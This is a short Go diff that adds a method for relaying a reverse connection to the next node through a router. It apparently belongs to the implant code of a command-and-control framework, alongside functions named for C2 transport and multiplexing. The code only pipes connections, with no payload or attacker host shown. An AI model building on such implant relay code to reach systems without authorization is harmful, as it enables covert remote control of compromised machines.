@@ -269,6 +269,27 @@ func (t *Transport) handleReverseC2(routeID uint32) (err error) {
 	return
 }
 
+func (t *Transport) HandleReverse(routeID uint32, src net.Conn) (err error) {
+
+	// Connect back with the route ID provided and route the connection.
+	var route bon.Route = bon.Route(routeID)
+
+	dst, err := ServerComms.Router.Connect(route)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[route] Error connecting to next node: %s", err.Error())
+		// {{end}}
+		return
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[mux] Outbound stream: muxing conn and piping")
+	// {{end}}
+
+	transport(src, dst) // Pipe connection
+
+	return
+}
+
 // setupMuxC2 - The transport waits for the server to mux the first stream and handles any error.
 func (t *Transport) setupMuxC2() (err error) {
 
